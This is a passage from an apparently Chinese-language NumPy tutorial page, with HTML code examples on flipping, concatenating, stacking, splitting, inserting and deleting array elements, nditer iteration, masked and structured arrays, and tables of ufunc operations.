axis2)</code></li><li>交换,将axis1和axis2进行互换</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.array([[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]])</span><br><span class="line">np.swapaxes(a,<span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="翻转"><a class="markdownIt-Anchor" href="#翻转"></a> 翻转</h3><h4 id="npflipm-axisnone"><a class="markdownIt-Anchor" href="#npflipm-axisnone"></a> <code>np.flip(m, axis=None)</code></h4><ul><li>numpy.flip(m, axis=None)</li><li>沿给定轴颠倒数组中元素的顺序</li><li>数组的形状被保留，但是元素被重新排序。</li></ul><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>flip(m, 0)</td><td>上下翻转 is equivalent to flipud(m).</td></tr><tr><td>flip(m, 1)</td><td>左右翻转 is equivalent to fliplr(m).</td></tr><tr><td>flip(m, n)</td><td>corresponds to m[…,::-1,…] with ::-1 at position n.</td></tr><tr><td>flip(m)</td><td>corresponds to m[::-1,::-1,…,::-1] with ::-1 at all positions.</td></tr><tr><td>flip(m, (0, 1))</td><td>corresponds to m[::-1,::-1,…] with ::-1 at position 0 and position 1.</td></tr></tbody></table><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">A = np.arange(<span class="number">8</span>).reshape((<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>)) <span class="comment"># array([[[0, 1],[2, 3]],[[4, 5],[6, 7]]])</span></span><br><span class="line">np.flip(A, <span class="number">0</span>) <span class="comment"># array([[[4, 5],[6, 7]],[[0, 1],[2, 3]]])</span></span><br><span class="line">np.flipud(A) <span class="comment"># array([[[4, 5],[6, 7]],[[0, 1],[2, 3]]])</span></span><br><span class="line">np.flip(A, <span class="number">1</span>) <span class="comment"># array([[[2, 3],[0, 1]],[[6, 7],[4, 5]]])</span></span><br><span class="line">np.fliplr(A) <span class="comment"># array([[[2, 3],[0, 1]],[[6, 7],[4, 5]]])</span></span><br><span class="line">np.flip(A) <span class="comment"># array([[[7, 6],[5, 4]],[[3, 2],[1, 0]]]</span></span><br><span class="line">np.flip(A, (<span class="number">0</span>, <span class="number">2</span>)) <span class="comment"># array([[[5, 4],[7, 6]],[[1, 0],[3, 2]]])</span></span><br></pre></td></tr></table></figure><h3 id="拼接"><a class="markdownIt-Anchor" href="#拼接"></a> 拼接</h3><h4 id="npconcatenate"><a class="markdownIt-Anchor" href="#npconcatenate"></a> <code>np.concatenate</code></h4><ul><li>沿指定轴拼接相同形状的两个或多个数组</li><li>默认axis=0拼接</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]]) </span><br><span class="line">b = np.array([[<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>]]) </span><br><span class="line"><span class="keyword">print</span> (np.concatenate((a,b))) <span class="comment"># [[1 2][3 4][5 6][7 8]]</span></span><br><span class="line">print(np.concatenate((a,b),axis = <span class="number">1</span>)) <span class="comment"># [[1 2 5 6][3 4 7 8]]</span></span><br></pre></td></tr></table></figure><h3 id="堆叠"><a class="markdownIt-Anchor" href="#堆叠"></a> 堆叠</h3><h4 id="npstack"><a class="markdownIt-Anchor" href="#npstack"></a> <code>np.stack</code></h4><ul><li>沿新轴堆叠若干个数组</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]]) <span class="comment"># [[1,2],[3,4]]</span></span><br><span class="line">b = np.array([[<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>]]) <span class="comment"># [[5,6],[7,8]]</span></span><br><span class="line">c = np.stack((a,b),<span class="number">0</span>)  <span class="comment"># [[[1 2][3 4]] [[5 6][7 8]]]  (2,2,2)</span></span><br></pre></td></tr></table></figure><h4 id="nphstack"><a class="markdownIt-Anchor" href="#nphstack"></a> <code>np.hstack</code></h4><ul><li>通过水平堆叠来生成数组</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = np.hstack((a,b)) <span class="comment"># [[1 2 5 6][3 4 7 8]]  (2, 4)</span></span><br></pre></td></tr></table></figure><h4 id="npvstack"><a class="markdownIt-Anchor" href="#npvstack"></a> <code>np.vstack</code></h4><ul><li>通过垂直堆叠来生成数组</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c = np.vstack((a,b)) <span class="comment"># [[1 2][3 4][5 6][7 8]]  (4, 2)</span></span><br></pre></td></tr></table></figure><h4 id="npc_xy"><a class="markdownIt-Anchor" href="#npc_xy"></a> <code>np.c_[x,y]</code></h4><ul><li>将切片对象沿第二个轴（列）拼接，相当于增加了维度，再np.hstack</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">np.c_[np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]),np.array([<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])] <span class="comment"># [[1 4][2 5][3 6] </span></span><br></pre></td></tr></table></figure><h4 id="npr_xy"><a class="markdownIt-Anchor" href="#npr_xy"></a> <code>np.r_[x,y]</code></h4><ul><li>将切片对象沿第一个轴（行）拼接</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">np.r_[np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]),<span class="number">0</span>,<span class="number">0</span>,np.array([<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>])] <span class="comment"># [[1 2 3 0 0 4 5 6]] </span></span><br></pre></td></tr></table></figure><h3 id="分割"><a class="markdownIt-Anchor" href="#分割"></a> 分割</h3><h4 id="npsplit"><a class="markdownIt-Anchor" href="#npsplit"></a> <code>np.split</code></h4><ul><li>沿特定的轴将数组分割为子数组</li><li><code>numpy.split(ary, indices_or_sections, axis)</code><ul><li>ary：被分割的数组</li><li>indices_or_sections：如果是一个整数，就用该数平均切分；如果是一个数组，为沿轴切分的位置</li><li>axis：沿着哪个维度进行切分。默认为0，横向切分。为1时，纵向切分。</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.arange(<span class="number">9</span>)</span><br><span class="line">b = np.split(a,<span class="number">3</span>)  <span class="comment"># [array([0, 1, 2]), array([3, 4, 5]), array([6, 7, 8])]</span></span><br><span class="line">b = np.split(a,[<span class="number">4</span>,<span class="number">7</span>])  <span class="comment"># [array([0, 1, 2, 3]), array([4, 5, 6]), array([7, 8])]</span></span><br></pre></td></tr></table></figure><h4 id="nphsplit"><a class="markdownIt-Anchor" href="#nphsplit"></a> <code>np.hsplit</code></h4><ul><li>用于水平分割数组，通过指定要返回的相同形状的数组数量来拆分原数组。</li></ul><h4 id="npvsplit"><a class="markdownIt-Anchor" href="#npvsplit"></a> <code>np.vsplit</code></h4><h3 id="修改大小"><a class="markdownIt-Anchor" href="#修改大小"></a> 修改大小</h3><h4 id="npresize"><a class="markdownIt-Anchor" href="#npresize"></a> np.resize</h4><ul><li>返回指定大小的新数组。如果新数组大小大于原始大小，则包含原始数组中的元素的副本。</li><li><code>numpy.resize(arr, shape)</code><ul><li>arr：要修改大小的数组</li><li>shape：返回数组的新形状</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]])</span><br><span class="line">b = np.resize(a, (<span class="number">3</span>,<span class="number">2</span>))</span><br></pre></td></tr></table></figure><h3 id="添加"><a class="markdownIt-Anchor" href="#添加"></a> 添加</h3><h4 id="append"><a class="markdownIt-Anchor" href="#append"></a> append</h4><ul><li>在数组的末尾添加值。 追加操作会分配整个数组，并把原来的数组复制到新数组中。 此外，输入数组的维度必须匹配否则将生成ValueError。</li><li><code>numpy.append(arr, values, axis=None)</code><ul><li>arr：输入数组</li><li>value：要向arr添加的值，需要和arr形状相同（除了要添加的轴）</li><li>axis：默认为 None。当axis无定义时，是横向添加，返回总是为一维数组。当axis有定义的时候，分别为0和1的时候。当axis为0时，数组是加在下边（列数要相同）。当axis为1时，数组是加在右边（行数要相同）。</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]])</span><br><span class="line">b = np.append(a, [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>])</span><br><span class="line">c = np.append(a, [[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]],axis = <span class="number">0</span>)</span><br><span class="line">d = np.append(a, [[<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]],axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="insert"><a class="markdownIt-Anchor" href="#insert"></a> insert</h4><ul><li>在给定索引之前，沿给定轴在输入数组中插入值。</li><li><code>numpy.insert(arr, obj, values, axis)</code><ul><li>arr：输入数组</li><li>obj：在其之前插入值的索引</li><li>values：要插入的值</li><li>axis：沿着它插入的轴，如果未提供，则输入数组会被展开</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">6</span>]])</span><br><span class="line">print(np.insert(a,<span class="number">3</span>,[<span class="number">11</span>,<span class="number">12</span>]))</span><br><span class="line"><span class="keyword">print</span> (np.insert(a,<span class="number">1</span>,[<span class="number">11</span>],axis = <span class="number">0</span>))</span><br><span class="line"><span class="keyword">print</span> (np.insert(a,<span class="number">1</span>,<span class="number">11</span>,axis = <span class="number">1</span>))</span><br></pre></td></tr></table></figure><h3 id="删除"><a class="markdownIt-Anchor" href="#删除"></a> 删除</h3><h4 id="delete"><a class="markdownIt-Anchor" href="#delete"></a> delete</h4><ul><li>返回从输入数组中删除指定子数组的新数组。 与 insert() 函数的情况一样，如果未提供轴参数，则输入数组将展开。</li><li><code>Numpy.delete(arr, obj, axis)</code><ul><li>arr：输入数组</li><li>obj：可以被切片，整数或者整数数组，表明要从输入数组删除的子数组</li><li>axis：沿着它删除给定子数组的轴，如果未提供，则输入数组会被展开</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">print(np.delete(a,<span class="number">5</span>))</span><br><span class="line">print(np.delete(a,<span class="number">1</span>,axis = <span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> (np.delete(a, np.s_[::<span class="number">2</span>]))</span><br></pre></td></tr></table></figure><h4 id="unique"><a class="markdownIt-Anchor" href="#unique"></a> unique</h4><ul><li>用于去除数组中的重复元素。</li><li><code>numpy.unique(arr, return_index, return_inverse, return_counts)</code><ul><li>arr：输入数组，如果不是一维数组则会展开</li><li>return_index：如果为true，返回新列表元素在旧列表中的位置（下标），并以列表形式储存</li><li>return_inverse：如果为true，返回旧列表元素在新列表中的位置（下标），并以列表形式储存</li><li>return_counts：如果为true，返回去重数组中的元素在原数组中的出现次数</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.array([<span class="number">5</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">9</span>])</span><br><span class="line">u = np.unique(a)</span><br><span class="line">u,indices = np.unique(a, return_index = <span class="literal">True</span>)</span><br><span class="line">u,indices = np.unique(a,return_inverse = <span class="literal">True</span>)</span><br><span class="line">u,indices = np.unique(a,return_counts = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="npnditer"><a class="markdownIt-Anchor" href="#npnditer"></a> np.nditer()</h3><h4 id="单数组迭代"><a class="markdownIt-Anchor" href="#单数组迭代"></a> 单数组迭代</h4><ul><li>迭代数组</li><li>a和a.T的元素以相同的顺序遍历，即按照它们存储在内存中的顺序；而a.T.copy(order=’C’)的元素以不同的顺序访问，因为它们被放入了不同的内存布局。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.arange(<span class="number">6</span>).reshape(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> np.nditer(a):</span><br><span class="line">    print(x, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> np.nditer(a.T):</span><br><span class="line">    print(x, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> np.nditer(a.T.copy(order=<span class="string">&#x27;C&#x27;</span>)):</span><br><span class="line">    print(x, end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="控制迭代顺序"><a class="markdownIt-Anchor" href="#控制迭代顺序"></a> 控制迭代顺序</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> np.nditer(a, order=<span class="string">&#x27;F&#x27;</span>): <span class="comment"># 列序优先</span></span><br><span class="line">    print(x, end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="修改数组值"><a class="markdownIt-Anchor" href="#修改数组值"></a> 修改数组值</h4><ul><li>默认情况下，nditer将输入操作数视为只读对象。 为了能够修改数组元素，必须使用每个操作数标志readwrite或writeonly指定读写模式或只写模式。</li><li>然后，nditer将产生可以修改的可写缓冲区数组。 但是，由于nditer必须在迭代完成后将此缓冲区数据复制回原始数组，因此必须使用两种方法之一通知结束迭代的时间。<ul><li>使用with语句将nditer用作上下文管理器，退出上下文时将写回临时数据。</li><li>迭代完成后，调用迭代器的close方法，这将触发回写。</li></ul></li><li>一旦调用close或退出其上下文，nditer将无法再进行迭代。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> np.nditer(a, op_flags=[<span class="string">&#x27;readwrite&#x27;</span>]) <span class="keyword">as</span> it:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> it:</span><br><span class="line">        x[...] = <span class="number">2</span> * x</span><br></pre></td></tr></table></figure><h4 id="广播数组迭代"><a class="markdownIt-Anchor" href="#广播数组迭代"></a> 广播数组迭代</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.arange(<span class="number">3</span>)</span><br><span class="line">b = np.arange(<span class="number">6</span>).reshape(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> x, y <span class="keyword">in</span> np.nditer([a,b]):</span><br><span class="line">     print(<span class="string">&quot;%d:%d&quot;</span> % (x,y), end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0</span>:<span class="number">0</span> <span class="number">1</span>:<span class="number">1</span> <span class="number">2</span>:<span class="number">2</span> <span class="number">0</span>:<span class="number">3</span> <span class="number">1</span>:<span class="number">4</span> <span class="number">2</span>:<span class="number">5</span> </span><br></pre></td></tr></table></figure><h1 id="maskedarray"><a class="markdownIt-Anchor" href="#maskedarray"></a> maskedarray</h1><ul><li>掩码数组(Masked arrays)是可能缺少条目或无效条目的数组。</li></ul><h2 id="创建掩码数组"><a class="markdownIt-Anchor" href="#创建掩码数组"></a> 创建掩码数组</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">-99</span>, <span class="number">5</span>])</span><br><span class="line">mx = np.ma.masked_array(x, mask=[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>masked_array(data=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, --, <span class="number">5</span>],mask=[<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>,  <span class="literal">True</span>, <span class="literal">False</span>],fill_value=<span class="number">999999</span>)</span><br></pre></td></tr></table></figure><h2 id="修改掩码"><a class="markdownIt-Anchor" href="#修改掩码"></a> 修改掩码</h2><ul><li>可以通过赋值来修改掩码：</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">mx[<span class="number">1</span>] = np.ma.masked</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>masked_array(data=[<span class="number">1</span>, --, <span class="number">3</span>, --, <span class="number">5</span>],mask=[<span class="literal">False</span>,  <span class="literal">True</span>, <span class="literal">False</span>,  <span class="literal">True</span>, <span class="literal">False</span>],fill_value=<span class="number">999999</span>)</span><br><span class="line">mx[<span class="number">1</span>] = <span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>masked_array(data=[<span class="number">1</span>, <span class="number">9</span>, <span class="number">3</span>, --, <span class="number">5</span>],mask=[<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>,  <span class="literal">True</span>, <span class="literal">False</span>],fill_value=<span class="number">999999</span>)</span><br></pre></td></tr></table></figure><ul><li>可以使用一个给定的值填充被掩码的条目，以获取通常的数组：</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x2 = mx.filled(<span class="number">-1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>array([ <span class="number">1</span>,  <span class="number">9</span>,  <span class="number">3</span>, <span class="number">-1</span>,  <span class="number">5</span>])</span><br></pre></td></tr></table></figure><h2 id="清除掩码"><a class="markdownIt-Anchor" href="#清除掩码"></a> 清除掩码</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">mx.mask = np.ma.nomask</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>masked_array(data=[<span class="number">1</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">-99</span>, <span class="number">5</span>],mask=[<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>],fill_value=<span class="number">999999</span>)</span><br></pre></td></tr></table></figure><h1 id="结构化数组"><a class="markdownIt-Anchor" href="#结构化数组"></a> 结构化数组</h1><ul><li>ndarray是同质的数据对象，即数组的所有元素必须是相同的数据类型。 另一方面，数据类型dytpe允许为每列定义单独的数据类型。</li><li>结构化数组是这样的ndarray，其数据类型是由较简单数据类型组合成的命名字段的序列（a sequence of named fields）。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = np.array([(<span class="string">&#x27;Rex&#x27;</span>, <span class="number">9</span>, <span class="number">81.0</span>), (<span class="string">&#x27;Fido&#x27;</span>, <span class="number">3</span>, <span class="number">27.0</span>)],dtype=[(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;U10&#x27;</span>), (<span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;i4&#x27;</span>), (<span class="string">&#x27;weight&#x27;</span>, <span class="string">&#x27;f4&#x27;</span>)])</span><br><span class="line">x[<span class="number">1</span>]    <span class="comment"># (&#x27;Fido&#x27;, 3, 27.)</span></span><br><span class="line">x[<span class="string">&#x27;age&#x27;</span>]    <span class="comment"># array([9, 3])</span></span><br><span class="line">x[<span class="string">&#x27;age&#x27;</span>] = <span class="number">5</span>    <span class="comment"># [(&#x27;Rex&#x27;, 5, 81.), (&#x27;Fido&#x27;, 5, 27.)]</span></span><br></pre></td></tr></table></figure><h2 id="创建-2"><a class="markdownIt-Anchor" href="#创建-2"></a> 创建</h2><ul><li>可以使用函数numpy.dtype创建结构化数据类型。有4种可选的形式，其灵活性和简洁性各不相同。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方法一：A list of tuples, one tuple per field</span></span><br><span class="line">np.dtype([(<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;f4&#x27;</span>), (<span class="string">&#x27;y&#x27;</span>, np.float32), (<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;f4&#x27;</span>, (<span class="number">2</span>, <span class="number">2</span>))])</span><br><span class="line"><span class="comment"># 方法二：A string of comma-separated dtype specifications</span></span><br><span class="line">np.dtype(<span class="string">&#x27;i8, f4, S3&#x27;</span>)</span><br><span class="line">np.dtype(<span class="string">&#x27;3int8, float32, (2, 3)float64&#x27;</span>)</span><br><span class="line"><span class="comment"># 方法三：A dictionary of field parameter arrays</span></span><br><span class="line">np.dtype(&#123;<span class="string">&#x27;names&#x27;</span>: [<span class="string">&#x27;col1&#x27;</span>, <span class="string">&#x27;col2&#x27;</span>], <span class="string">&#x27;formats&#x27;</span>: [<span class="string">&#x27;i4&#x27;</span>, <span class="string">&#x27;f4&#x27;</span>]&#125;) </span><br><span class="line"> np.dtype(&#123;<span class="string">&#x27;names&#x27;</span>: [<span class="string">&#x27;col1&#x27;</span>, <span class="string">&#x27;col2&#x27;</span>],</span><br><span class="line">           <span class="string">&#x27;formats&#x27;</span>: [<span class="string">&#x27;i4&#x27;</span>, <span class="string">&#x27;f4&#x27;</span>],</span><br><span class="line">           <span class="string">&#x27;offsets&#x27;</span>: [<span class="number">0</span>, <span class="number">4</span>],</span><br><span class="line">           <span class="string">&#x27;itemsize&#x27;</span>: <span class="number">12</span>&#125;)</span><br><span class="line"><span class="comment"># 方法四：A dictionary of field names</span></span><br><span class="line">np.dtype(&#123;<span class="string">&#x27;col1&#x27;</span>: (<span class="string">&#x27;i1&#x27;</span>, <span class="number">0</span>), <span class="string">&#x27;col2&#x27;</span>: (<span class="string">&#x27;f4&#x27;</span>, <span class="number">1</span>)&#125;)</span><br><span class="line"><span class="comment"># 不建议使用此格式，因为Python字典不会在Python 3.6之前的Python版本中保留顺序，但是一个结构化dtype中字段的顺序具有含义。</span></span><br></pre></td></tr></table></figure><h1 id="通用函数ufunc"><a class="markdownIt-Anchor" href="#通用函数ufunc"></a> 通用函数(ufunc)</h1><ul><li>通用函数（简称ufunc）是一种以逐元素的方式在ndarray上操作的函数，支持数组广播、类型转换和其他几个标准功能。 也就是说，ufunc是函数的“向量化”包装器（“vectorized” wrapper），该函数采用固定数量的特定输入并产生固定数量的特定输出。</li></ul><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>ufunc.reduce(a[, axis, dtype, out, …])</td><td>Reduces a’s dimension by one, by applying ufunc along one axis.</td></tr><tr><td>ufunc.accumulate(array[, axis, dtype, out])</td><td>Accumulate the result of applying the operator to all elements.</td></tr><tr><td>ufunc.reduceat(a, indices[, axis, dtype, out])</td><td>Performs a (local) reduce with specified slices over a single axis.</td></tr><tr><td>ufunc.outer(A, B, **kwargs)</td><td>Apply the ufunc op to all pairs (a, b) with a in A and b in B.</td></tr><tr><td><a href="http://ufunc.at">ufunc.at</a>(a, indices[, b])</td><td>Performs unbuffered in place operation on operand ‘a’ for elements specified by ‘indices’.</td></tr></tbody></table><h2 id="ufuncreducea-axis-dtype-out"><a class="markdownIt-Anchor" href="#ufuncreducea-axis-dtype-out"></a> ufunc.reduce(a[, axis, dtype, out, …])</h2><ul><li>Reduces a’s dimension by one, by applying ufunc along one axis.</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">np.add.reduce(a)</span><br></pre></td></tr></table></figure><h2 id="ufuncaccumulatearray-axis-dtype-out"><a class="markdownIt-Anchor" href="#ufuncaccumulatearray-axis-dtype-out"></a> ufunc.accumulate(array[, axis, dtype, out])</h2><ul><li>Accumulate the result of applying the operator to all elements.</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">np.add.accumulate(a)</span><br></pre></td></tr></table></figure><h2 id="ufuncreduceata-indices-axis-dtype-out"><a class="markdownIt-Anchor" href="#ufuncreduceata-indices-axis-dtype-out"></a> ufunc.reduceat(a, indices[, axis, dtype, out])</h2><ul><li>Performs a (local) reduce with specified slices over a single axis.</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.array(</span><br><span class="line">[<span class="number">0</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>])</span><br><span class="line">indices = np.array([<span class="number">1</span>,<span class="number">4</span>])</span><br><span class="line">np.add.reduceat(a,indices)</span><br></pre></td></tr></table></figure><h2 id="ufuncoutera-b-kwargs"><a class="markdownIt-Anchor" href="#ufuncoutera-b-kwargs"></a> ufunc.outer(A, B, **kwargs)</h2><ul><li>Apply the ufunc op to all pairs (a, b) with a in A and b in B.</li></ul><h2 id="ufuncat"><a class="markdownIt-Anchor" href="#ufuncat"></a> <a href="http://ufunc.at">ufunc.at</a>(a, indices[, b])</h2><ul><li>Performs unbuffered in place operation on operand ‘a’ for elements specified by ‘indices’.</li></ul><h2 id="算术操作-math-operations"><a class="markdownIt-Anchor" href="#算术操作-math-operations"></a> 算术操作 （Math operations）</h2><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>add(x1, x2, /[, out, where, casting, order, …])</td><td>Add arguments element-wise.</td></tr><tr><td>subtract(x1, x2, /[, out, where, casting, …])</td><td>Subtract arguments, element-wise.</td></tr><tr><td>multiply(x1, x2, /[, out, where, casting, …])</td><td>Multiply arguments element-wise.</td></tr><tr><td>divide(x1, x2, /[, out, where, casting, …])</td><td>Returns a true division of the inputs, element-wise.</td></tr></tbody></table><h2 id="三角函数-trigonometric-functions"><a class="markdownIt-Anchor" href="#三角函数-trigonometric-functions"></a> 三角函数 （Trigonometric functions）</h2><ul><li>当用角度时，所有三角函数都使用弧度。 度与弧度的比率为180/pi。</li></ul><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>sin(x, /[, out, where, casting, order, …])</td><td>Trigonometric sine, element-wise.</td></tr><tr><td>cos(x, /[, out, where, casting, order, …])</td><td>Cosine element-wise.</td></tr><tr><td>tan(x, /[, out, where, casting, order, …])</td><td>Compute tangent element-wise.</td></tr></tbody></table><h2 id="比特操作函数-bit-twiddling-functions"><a class="markdownIt-Anchor" href="#比特操作函数-bit-twiddling-functions"></a> 比特操作函数 （Bit-twiddling functions）</h2><ul><li>These function all require integer arguments and they manipulate the bit-pattern of those arguments.</li></ul><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>bitwise_and(x1, x2, /[, out, where, …])</td><td>Compute the bit-wise AND of two arrays element-wise.</td></tr><tr><td>bitwise_or(x1, x2, /[, out, where, casting, …])</td><td>Compute the bit-wise OR of two arrays element-wise.</td></tr><tr><td>bitwise_xor(x1, x2, /[, out, where, …])</td><td>Compute the bit-wise XOR of two arrays element-wise.</td></tr></tbody></table><h2 id="比较函数-comparison-functions"><a class="markdownIt-Anchor" href="#比较函数-comparison-functions"></a> 比较函数 （Comparison functions）</h2><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>greater(x1, x2, /[, out, where, casting, …])</td><td>Return the truth value of (x1 &gt; x2) element-wise.</td></tr><tr><td>greater_equal(x1, x2, /[, out, where, …])</td><td>Return the truth value of (x1 &gt;= x2) element-wise.</td></tr><tr><td>less(x1, x2, /[, out, where, casting, …])</td><td>Return the truth value of (x1 &lt; x2) element-wise.</td></tr><tr><td>less_equal(x1, x2, /[, out, where, casting, …])</td><td>Return the truth value of (x1 =&lt; x2) element-wise.</td></tr><tr><td>not_equal(x1, x2, /[, out, where, casting, …])</td><td>Return (x1 != x2) element-wise.</td></tr><tr><td>equal(x1, x2, /[, out, where, casting, …])</td><td>Return (x1 == x2) element-wise.</td></tr></tbody></table><h2 id="浮点函数-floating-functions"><a class="markdownIt-Anchor" href="#浮点函数-floating-functions"></a> 浮点函数 (Floating functions)</h2><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>isfinite(x, /[, out, where, casting, order, …])</td><td>Test element-wise for finiteness (not infinity or not Not a Number).</td></tr><tr><td>isinf(x, /[, out, where, casting, order, …])</td><td>Test element-wise for positive or negative infinity.</td></tr><tr><td>isnan(x, /[, out, where, casting, order, …])</td><td>Test element-wise for NaN and return result as a boolean array.</td></tr><tr><td>isnat(x, /[, out, where, casting, order, …])</td><td>Test element-wise for NaT (not a time) and return result as a boolean array.</td></tr><tr><td>fabs(x, /[, out, where, casting, order, …])</td><td>Compute the absolute values element-wise.</td></tr><tr><td>nan_to_num(x, [num])</td><td>将nan替换为num，默认nan替换为0，inf替换为极大值1e308</td></tr></tbody></table><h2 id="聚合函数"><a class="markdownIt-Anchor" href="#聚合函数"></a> 聚合函数</h2><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>sum(a[, axis])</td><td>求和，Sum of array elements over a given axis.</td></tr><tr><td>prod(a[, axis])</td><td>求积Return the product of array elements over a given axis.</td></tr><tr><td>diff(a[, n, axis])</td><td>Calculate the n-th discrete difference along given axis.</td></tr><tr><td>cumsum(a[, axis, dtype, out])</td><td>Return the cumulative sum of the elements along a given axis.</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">np.sum([0.5, 1.5]) # 2</span><br><span class="line">np.sum([0.5, 0.7, 0.2, 1.5], dtype&#x3D;np.int32) # 1</span><br><span class="line">np.prod([[1.,2.],[3.,4.]], axis&#x3D;0) # array([3., 8.])</span><br><span class="line">np.prod([[1.,2.],[3.,4.]], axis&#x3D;1) # array([ 2., 12.])</span><br><span 